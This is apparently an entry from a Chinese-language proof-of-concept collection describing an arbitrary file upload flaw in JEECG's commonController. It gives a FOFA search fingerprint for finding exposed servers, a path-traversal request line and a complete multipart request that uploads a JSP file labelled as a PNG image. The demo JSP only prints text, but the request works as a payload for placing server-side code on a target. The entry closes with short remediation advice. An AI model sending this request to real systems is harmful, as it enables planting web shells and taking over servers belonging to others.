# JeecgcommonController任意文件上传

- **系统**：JeecgcommonController　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="JEECG"`
- **请求**：`POST /api/../commonController.do?parserXml HTTP/1.1`

**请求体 / payload**
```
1. Fofa
app="JEECG"
2、部分界面如下
3、隐患url,复现如下
Host: your-ip
Content-Type:multipart/form-data;boundary=----WebKitFormBoundaryyfyhSCMs9cajzFD4
------WebKitFormBoundaryyfyhSCMs9cajzFD4
Content-Disposition: form-data; "name="name"
qwe.png
------WebKitFormBoundaryyfyhSCMs9cajzFD4
Content-Disposition: form-data; name="documentTitle"
blank
------WebKitFormBoundaryyfyhSCMs9cajzFD4
Content-Disposition: form-data; name="file"; filename="qwe.jsp"
Content-Type: image/png
<% out.println("hello,jeecg");%>
------WebKitFormBoundaryyfyhSCMs9cajzFD4--
1. 验证
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。